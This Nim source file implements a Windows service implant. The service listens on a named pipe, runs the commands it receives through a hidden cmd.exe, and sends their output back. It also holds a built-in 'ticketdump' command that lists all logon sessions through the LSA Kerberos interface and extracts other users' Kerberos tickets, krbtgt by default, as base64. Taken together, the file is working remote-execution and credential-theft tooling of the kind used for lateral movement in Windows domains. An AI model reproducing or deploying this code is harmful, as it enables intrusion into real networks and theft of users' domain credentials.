import std/[winlean, os, strutils, base64]

type
  SERVICE_STATUS = object
    dwServiceType: int32
    dwCurrentState: int32
    dwControlsAccepted: int32
    dwWin32ExitCode: int32
    dwServiceSpecificExitCode: int32
    dwCheckPoint: int32
    dwWaitHint: int32

  SERVICE_TABLE_ENTRYW = object
    lpServiceName: WideCString
    lpServiceProc: pointer

  HandlerExProc = proc (ctrl, evType: int32; evData, ctx: pointer): int32 {.stdcall.}
  LUID = object
    LowPart: uint32
    HighPart: int32
  LsaString = object
    Length: uint16
    MaximumLength: uint16
    Buffer: cstring
  UniString = object
    Length: uint16
    MaximumLength: uint16
    Buffer: pointer
  SecHandle = object
    dwLower: uint
    dwUpper: uint
  LogonSessionData = object
    Size: uint32
    LogonId: LUID
    UserName: UniString
    LogonDomain: UniString
    AuthenticationPackage: UniString
    LogonType: uint32
    Session: uint32
    Sid: pointer
    LogonTime: int64
    LogonServer: UniString
    DnsDomainName: UniString
    Upn: UniString
  KerbQueryTicketCacheRequest = object
    MessageType: uint32
    LogonId: LUID
  KerbTicketCacheInfoEx = object
    ClientName: UniString
    ClientRealm: UniString
    ServerName: UniString
    ServerRealm: UniString
    StartTime: int64
    EndTime: int64
    RenewTime: int64
    EncryptionType: int32
    TicketFlags: uint32
  KerbRetrieveTicketRequest = object
    MessageType: uint32
    LogonId: LUID
    TargetName: UniString
    TicketFlags: uint32
    CacheOptions: uint32
    EncryptionType: int32
    CredentialsHandle: SecHandle
  KerbExternalTicket = object
    ServiceName: pointer
    TargetName: pointer
    ClientName: pointer
    DomainName: UniString
    TargetDomainName: UniString
    AltTargetDomainName: UniString
    SessionKey: array[3, uint]
    TicketFlags: uint32
    Flags: uint32
    KeyExpirationTime: int64
    StartTime: int64
    EndTime: int64
    RenewUntil: int64
    TimeSkew: int64
    EncodedTicketSize: uint32
    EncodedTicket: pointer

const
  SERVICE_WIN32_OWN_PROCESS = 0x00000010'i32
  SERVICE_START_PENDING     = 0x00000002'i32
  SERVICE_RUNNING           = 0x00000004'i32
  SERVICE_STOP_PENDING      = 0x00000003'i32
  SERVICE_STOPPED           = 0x00000001'i32
  SERVICE_ACCEPT_STOP       = 0x00000001'i32
  SERVICE_ACCEPT_SHUTDOWN   = 0x00000004'i32
  SERVICE_CONTROL_STOP      = 0x00000001'i32
  SERVICE_CONTROL_SHUTDOWN  = 0x00000005'i32

  PIPE_TYPE_BYTE           = 0x00000000'i32
  PIPE_READMODE_BYTE       = 0x00000000'i32
  PIPE_WAIT                = 0x00000000'i32
  PIPE_UNLIMITED_INSTANCES = 255'i32

proc startServiceCtrlDispatcherW(table: ptr SERVICE_TABLE_ENTRYW): WINBOOL
  {.stdcall, dynlib: "advapi32", importc: "StartServiceCtrlDispatcherW".}
proc registerServiceCtrlHandlerExW(name: WideCString; handler: HandlerExProc;
                                   ctx: pointer): pointer
  {.stdcall, dynlib: "advapi32", importc: "RegisterServiceCtrlHandlerExW".}
proc setServiceStatus(h: pointer; status: ptr SERVICE_STATUS): WINBOOL
  {.stdcall, dynlib: "advapi32", importc: "SetServiceStatus".}
proc disconnectNamedPipe(h: Handle): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "DisconnectNamedPipe".}
proc connectNamedPipe(h: Handle; ov: pointer): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "ConnectNamedPipe".}
proc flushFileBuffers2(h: Handle): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "FlushFileBuffers".}
proc setHandleInformation(h: Handle; mask, flags: int32): WINBOOL
  {.stdcall, dynlib: "kernel32", importc: "SetHandleInformation".}
proc lsaConnectUntrusted(handle: ptr pointer): int32
  {.stdcall, dynlib: "secur32", importc: "LsaConnectUntrusted".}
proc lsaDeregisterLogonProcess(handle: pointer): int32
  {.stdcall, dynlib: "secur32", importc: "LsaDeregisterLogonProcess".}
proc lsaLookupAuthenticationPackage(handle: pointer; packageName: ptr LsaString;
                                    authPackage: ptr uint32): int32
  {.stdcall, dynlib: "secur32", importc: "LsaLookupAuthenticationPackage".}
proc lsaCallAuthenticationPackage(handle: pointer; authPackage: uint32;
                                  submitBuffer: pointer; submitLength: uint32;
                                  returnBuffer: ptr pointer; returnLength: ptr uint32;
                                  protocolStatus: ptr int32): int32
  {.stdcall, dynlib: "secur32", importc: "LsaCallAuthenticationPackage".}
proc lsaFreeReturnBuffer(buffer: pointer): int32
  {.stdcall, dynlib: "secur32", importc: "LsaFreeReturnBuffer".}
proc lsaNtStatusToWinError(status: uint32): uint32
  {.stdcall, dynlib: "advapi32", importc: "LsaNtStatusToWinError".}
proc lsaEnumerateLogonSessions(count: ptr uint64; sessions: ptr pointer): int32
  {.stdcall, dynlib: "secur32", importc: "LsaEnumerateLogonSessions".}
proc lsaGetLogonSessionData(logonId: ptr LUID; data: ptr pointer): int32
  {.stdcall, dynlib: "secur32", importc: "LsaGetLogonSessionData".}
proc copyMemory(dst, src: pointer; len: int)
  {.stdcall, dynlib: "kernel32", importc: "RtlMoveMemory".}

var
  gStatusHandle: pointer
  gStatus:  SERVICE_STATUS
  gPipe:    Handle = INVALID_HANDLE_VALUE
  gProcess: Handle = 0
  gSvcName: string
  gPipeName: string

proc initForeignCallbackThread() =
  when compileOption("threads") and declared(setupForeignThreadGc):
    setupForeignThreadGc()

proc report(state, exitCode: int32; waitHint = 0'i32) =
  gStatus.dwServiceType   = SERVICE_WIN32_OWN_PROCESS
  gStatus.dwCurrentState  = state
  gStatus.dwWin32ExitCode = exitCode
  gStatus.dwWaitHint      = waitHint
  gStatus.dwControlsAccepted =
    if state == SERVICE_RUNNING:
      SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_SHUTDOWN
    else: 0
  if gStatusHandle != nil:
    discard setServiceStatus(gStatusHandle, addr gStatus)

proc safeClose(h: var Handle) =
  if h != 0 and h != INVALID_HANDLE_VALUE:
    discard closeHandle(h)
    h = 0

proc readExact(h: Handle; buf: pointer; n: int): bool =
  var got: int32
  var off = 0
  while off < n:
    if readFile(h, cast[pointer](cast[uint](buf) + uint(off)),
                int32(n - off), addr got, nil) == 0 or got == 0:
      return false
    off += int(got)
  true

proc writeAll(h: Handle; buf: pointer; n: int): bool =
  var put: int32
  var off = 0
  while off < n:
    if writeFile(h, cast[pointer](cast[uint](buf) + uint(off)),
                 int32(n - off), addr put, nil) == 0:
      return false
    off += int(put)
  true

proc writeU32(h: Handle; v: uint32): bool =
  var b: array[4, byte]
  b[0] = byte(v and 0xff)
  b[1] = byte((v shr 8) and 0xff)
  b[2] = byte((v shr 16) and 0xff)
  b[3] = byte((v shr 24) and 0xff)
  writeAll(h, addr b[0], 4)

proc readU32(h: Handle; v: var uint32): bool =
  var b: array[4, byte]
  if not readExact(h, addr b[0], 4): return false
  v = uint32(b[0]) or (uint32(b[1]) shl 8) or
      (uint32(b[2]) shl 16) or (uint32(b[3]) shl 24)
  true

proc uniToString(u: UniString): string =
  if u.Buffer == nil or u.Length == 0:
    return ""
  let chars = int(u.Length div 2)
  for i in 0 ..< chars:
    let p = cast[ptr UncheckedArray[uint16]](u.Buffer)
    let w = p[i]
    if w == 0: break
    if w <= 0x7f'u16:
      result.add chr(int(w))
    else:
      result.add '?'

proc asciiToUtf16Le(text: string): string =
  for c in text:
    result.add c
    result.add '\0'
  result.add '\0'
  result.add '\0'

proc writeTextPipe(text: string; exitCode = 0'u32) =
  if gPipe == 0 or gPipe == INVALID_HANDLE_VALUE:
    if text.len > 0:
      stdout.write text
    quit(int(exitCode))
  if text.len > 0:
    discard writeU32(gPipe, uint32(text.len))
    discard writeAll(gPipe, unsafeAddr text[0], text.len)
  discard writeU32(gPipe, 0xFFFFFFFF'u32)
  discard writeU32(gPipe, exitCode)
  discard flushFileBuffers2(gPipe)

proc retrieveKerbCred(lsa: pointer; authPack: uint32; luid: LUID;
                      targetName: string; ticketFlags: uint32): tuple[ok: bool; data: string; err: string] =
  let targetUtf = asciiToUtf16Le(targetName)
  let baseSize = sizeof(KerbRetrieveTicketRequest)
  let totalSize = baseSize + targetUtf.len
  let buf = alloc0(totalSize)
  if buf == nil:
    return (false, "", "alloc failed")
  var retBuf: pointer = nil
  try:
    var req = cast[ptr KerbRetrieveTicketRequest](buf)
    req.MessageType = 8'u32
    req.LogonId = luid
    req.TargetName.Length = uint16(targetUtf.len - 2)
    req.TargetName.MaximumLength = uint16(targetUtf.len)
    req.TargetName.Buffer = cast[pointer](cast[uint](buf) + uint(baseSize))
    req.TicketFlags = ticketFlags
    req.CacheOptions = 0x8'u32
    req.EncryptionType = 0
    copyMemory(req.TargetName.Buffer, unsafeAddr targetUtf[0], targetUtf.len)
    var retLen: uint32 = 0
    var protStatus: int32 = 0
    let status = lsaCallAuthenticationPackage(lsa, authPack, buf, uint32(totalSize),
      addr retBuf, addr retLen, addr protStatus)
    if status != 0 or protStatus != 0 or retBuf == nil or retLen == 0:
      let winErr = lsaNtStatusToWinError(uint32(protStatus))
      return (false, "", "lsa retrieve failed status=" & $status & " protocol=" & $protStatus & " win32=" & $winErr)
    let ext = cast[ptr KerbExternalTicket](retBuf)
    if ext.EncodedTicket == nil or ext.EncodedTicketSize == 0:
      return (false, "", "empty encoded ticket")
    let n = int(ext.EncodedTicketSize)
    var raw = newString(n)
    copyMemory(addr raw[0], ext.EncodedTicket, n)
    return (true, raw, "")
  finally:
    if retBuf != nil: discard lsaFreeReturnBuffer(retBuf)
    dealloc(buf)

proc dumpTicketsCommand(args: string) =
  let parts = args.splitWhitespace()
  let userFilter = if parts.len >= 1: parts[0].toLowerAscii() else: ""
  let serviceFilter = if parts.len >= 2: parts[1].toLowerAscii() else: "krbtgt"
  var output = ""
  var lsa: pointer = nil
  let connectStatus = lsaConnectUntrusted(addr lsa)
  if connectStatus != 0 or lsa == nil:
    writeTextPipe("lsa connect failed status=" & $connectStatus & "\r\n", 1)
    return
  defer:
    discard lsaDeregisterLogonProcess(lsa)

  var name = "kerberos"
  var ls = LsaString(Length: uint16(name.len), MaximumLength: uint16(name.len + 1),
    Buffer: name.cstring)
  var authPack: uint32 = 0
  let lookupStatus = lsaLookupAuthenticationPackage(lsa, addr ls, addr authPack)
  if lookupStatus != 0:
    writeTextPipe("lsa kerberos package lookup failed status=" & $lookupStatus & "\r\n", 1)
    return

  var count: uint64 = 0
  var luidPtr: pointer = nil
  let enumStatus = lsaEnumerateLogonSessions(addr count, addr luidPtr)
  if enumStatus != 0 or luidPtr == nil:
    writeTextPipe("lsa enumerate sessions failed status=" & $enumStatus & "\r\n", 1)
    return
  defer:
    discard lsaFreeReturnBuffer(luidPtr)

  let luids = cast[ptr UncheckedArray[LUID]](luidPtr)
  for i in 0 ..< int(count):
    let luid = luids[i]
    var sessionPtr: pointer = nil
    if lsaGetLogonSessionData(unsafeAddr luid, addr sessionPtr) != 0 or sessionPtr == nil:
      continue
    defer:
      discard lsaFreeReturnBuffer(sessionPtr)
    let session = cast[ptr LogonSessionData](sessionPtr)
    let username = uniToString(session.UserName)
    let domain = uniToString(session.LogonDomain)
    if userFilter.len > 0 and not username.toLowerAscii().contains(userFilter):
      continue

    var query = KerbQueryTicketCacheRequest(MessageType: 15'u32, LogonId: luid)
    var ticketsPtr: pointer = nil
    var retLen: uint32 = 0
    var protStatus: int32 = 0
    let qstatus = lsaCallAuthenticationPackage(lsa, authPack, addr query,
      uint32(sizeof(KerbQueryTicketCacheRequest)), addr ticketsPtr, addr retLen, addr protStatus)
    if qstatus != 0 or protStatus != 0 or ticketsPtr == nil:
      continue
    defer:
      discard lsaFreeReturnBuffer(ticketsPtr)
    let ticketCount = cast[ptr UncheckedArray[uint32]](ticketsPtr)[1]
    let first = cast[uint](ticketsPtr) + 8'u
    for j in 0 ..< int(ticketCount):
      let info = cast[ptr KerbTicketCacheInfoEx](first + uint(j * sizeof(KerbTicketCacheInfoEx)))
      let server = uniToString(info.ServerName)
      let client = uniToString(info.ClientName)
      let realm = uniToString(info.ClientRealm)
      if serviceFilter.len > 0 and not server.toLowerAscii().startsWith(serviceFilter):
        continue
      let got = retrieveKerbCred(lsa, authPack, luid, server, info.TicketFlags)
      if got.ok:
        output.add "LUID=0x" & toHex(luid.LowPart) & " USER=" & domain & "\\" & username &
          " CLIENT=" & client & "@" & realm & " SERVER=" & server & "\r\n"
        output.add encode(got.data) & "\r\n"
      elif output.len == 0:
        output.add "retrieve failed for " & domain & "\\" & username & " " & server & ": " & got.err & "\r\n"
  if output.len == 0:
    output = "no matching tickets\r\n"
  writeTextPipe(output)

proc utf16CommandToAscii(cmdUtf16: string): string =
  let chars = cmdUtf16.len div 2
  for i in 0 ..< chars:
    let lo = uint16(byte(cmdUtf16[i * 2]))
    let hi = uint16(byte(cmdUtf16[i * 2 + 1]))
    let w = lo or (hi shl 8)
    if w == 0: break
    if w <= 0x7f'u16: result.add chr(int(w))
    else: result.add '?'

proc runCommand(cmdUtf16: string) =
  let plain = utf16CommandToAscii(cmdUtf16)
  if plain.startsWith("__nimux_ticketdump"):
    dumpTicketsCommand(plain["__nimux_ticketdump".len .. ^1].strip())
    return
  let chars = cmdUtf16.len div 2
  const Prefix = "cmd.exe /Q /c "
  var wide = newSeq[uint16](Prefix.len + chars + 1)
  for i, c in Prefix:
    wide[i] = uint16(ord(c))
  for i in 0 ..< chars:
    let lo = uint16(byte(cmdUtf16[i * 2]))
    let hi = uint16(byte(cmdUtf16[i * 2 + 1]))
    wide[Prefix.len + i] = lo or (hi shl 8)
  wide[Prefix.len + chars] = 0

  var sa: SECURITY_ATTRIBUTES
  sa.nLength = int32(sizeof(SECURITY_ATTRIBUTES))
  sa.bInheritHandle = 1
  sa.lpSecurityDescriptor = nil
  var rdEnd, wrEnd: Handle
  if createPipe(rdEnd, wrEnd, sa, 0) == 0:
    discard writeU32(gPipe, 0xFFFFFFFF'u32)
    discard writeU32(gPipe, 0xFFFFFFFE'u32)
    return
  discard setHandleInformation(rdEnd, HANDLE_FLAG_INHERIT, 0)

  var si: STARTUPINFO
  si.cb = int32(sizeof(STARTUPINFO))
  si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
  si.wShowWindow = 0
  si.hStdInput  = INVALID_HANDLE_VALUE
  si.hStdOutput = wrEnd
  si.hStdError  = wrEnd
  var pi: PROCESS_INFORMATION
  let appName: WideCString = nil
  let cmdLine = cast[WideCString](addr wide[0])
  let ok = createProcessW(appName, cmdLine, nil, nil, 1,
                          CREATE_NO_WINDOW or CREATE_UNICODE_ENVIRONMENT,
                          nil, nil, si, pi)
  discard closeHandle(wrEnd)
  if ok == 0:
    discard closeHandle(rdEnd)
    discard writeU32(gPipe, 0xFFFFFFFF'u32)
    discard writeU32(gPipe, uint32(getLastError()))
    return

  gProcess = pi.hProcess
  discard closeHandle(pi.hThread)

  var buf: array[4096, byte]
  while true:
    var got: int32 = 0
    let r = readFile(rdEnd, addr buf[0], int32(buf.len), addr got, nil)
    if r == 0 or got <= 0:
      break
    if not writeU32(gPipe, uint32(got)): break
    if not writeAll(gPipe, addr buf[0], int(got)): break

  discard waitForSingleObject(pi.hProcess, INFINITE)
  var ec: int32 = 0
  discard getExitCodeProcess(pi.hProcess, ec)
  discard closeHandle(pi.hProcess)
  gProcess = 0
  discard closeHandle(rdEnd)
  discard writeU32(gPipe, 0xFFFFFFFF'u32)
  discard writeU32(gPipe, uint32(ec))
  discard flushFileBuffers2(gPipe)

proc ctrlHandler(ctrl, evType: int32; evData, ctx: pointer): int32 {.stdcall.} =
  initForeignCallbackThread()
  case ctrl
  of SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN:
    report(SERVICE_STOP_PENDING, 0, 2_000)
    if gProcess != 0:
      discard terminateProcess(gProcess, 1)
    if gPipe != INVALID_HANDLE_VALUE:
      discard disconnectNamedPipe(gPipe)
      safeClose(gPipe)
    report(SERVICE_STOPPED, 0)
  else: discard
  0

proc servePipe(useScmStatus: bool) =
  if useScmStatus:
    report(SERVICE_START_PENDING, 0, 3_000)
  let name = newWideCString(r"\\.\pipe\" & gPipeName)
  gPipe = createNamedPipe(name,
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES, 65_536, 65_536, 30_000, nil)
  if gPipe == INVALID_HANDLE_VALUE:
    if useScmStatus:
      report(SERVICE_STOPPED, getLastError())
    return

  if useScmStatus:
    report(SERVICE_RUNNING, 0)

  if connectNamedPipe(gPipe, nil) == 0:
    if getLastError() != 535:
      if useScmStatus:
        report(SERVICE_STOPPED, getLastError())
      return

  while true:
    var cmdLen: uint32
    if not readU32(gPipe, cmdLen): break
    if cmdLen == 0: break
    if cmdLen > 1_048_576'u32: break
    var cmdBuf = newString(int(cmdLen))
    if not readExact(gPipe, addr cmdBuf[0], int(cmdLen)): break
    runCommand(cmdBuf)

  discard flushFileBuffers2(gPipe)
  discard disconnectNamedPipe(gPipe)
  safeClose(gPipe)
  if useScmStatus:
    report(SERVICE_STOPPED, 0)

proc serviceMain(argc: int32; argv: ptr UncheckedArray[WideCString]) {.stdcall.} =
  initForeignCallbackThread()
  gStatusHandle = registerServiceCtrlHandlerExW(
    if argc > 0 and argv != nil: argv[0] else: newWideCString(gSvcName),
    ctrlHandler, nil)
  if gStatusHandle == nil: return
  servePipe(true)

proc main() =
  if paramCount() >= 1 and paramStr(1) == "__ticketdump":
    var args = ""
    for i in 2 .. paramCount():
      if args.len > 0: args.add " "
      args.add paramStr(i)
    dumpTicketsCommand(args)
    return
  gSvcName  = if paramCount() >= 1: paramStr(1) else: "nimuxsvc"
  gPipeName = if paramCount() >= 2: paramStr(2) else: "nimuxsvc"
  if paramCount() >= 2:
    servePipe(false)
    return
  var table: array[2, SERVICE_TABLE_ENTRYW]
  table[0].lpServiceName = newWideCString(gSvcName)
  table[0].lpServiceProc = cast[pointer](serviceMain)
  table[1].lpServiceName = nil
  table[1].lpServiceProc = nil
  if startServiceCtrlDispatcherW(addr table[0]) == 0:
    servePipe(false)

when isMainModule:
  main()
